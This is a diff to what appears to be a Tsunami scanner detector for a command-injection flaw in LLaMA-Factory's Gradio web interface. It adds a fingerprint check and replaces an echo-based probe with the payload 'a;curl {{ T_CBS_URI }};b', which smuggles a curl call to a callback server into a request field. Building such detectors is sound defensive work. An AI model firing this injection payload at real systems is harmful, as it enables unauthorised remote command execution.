@@ -34,6 +34,23 @@ config: {}
 ###########
 
 actions: {
+  name: "fingerprint_llamafactory"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "window.gradio_config" },
+          { body: {} contains: "LLaMA Board" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
   name: "join_queue_with_payload"
   http_request: {
     method: POST
@@ -67,13 +84,18 @@ actions: {
     ]
     response: {
       http_status: 200
-      expect_all: {
-        conditions: [
-          { body: {} contains: "{{ payload_result }}" }
-        ]
-      }
     }
   }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 2000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
 }
 
 #############
@@ -81,14 +103,17 @@ actions: {
 #############
 
 workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
   variables: [
     { name: "session_hash" value: "tsunami{{ T_UTL_CURRENT_TIMESTAMP_MS }}" },
-    { name: "payload" value: "{echo,tsunami$((1250+50*2))}" },
-    { name: "payload_result" value: "tsunami1350" }
+    { name: "payload" value: "a;curl {{ T_CBS_URI }};b" }
   ]
 
   actions: [
+    "fingerprint_llamafactory",
     "join_queue_with_payload",
-    "retrieve_execution_result"
+    "retrieve_execution_result",
+    "sleep",
+    "check_callback_server_logs"
   ]
 }
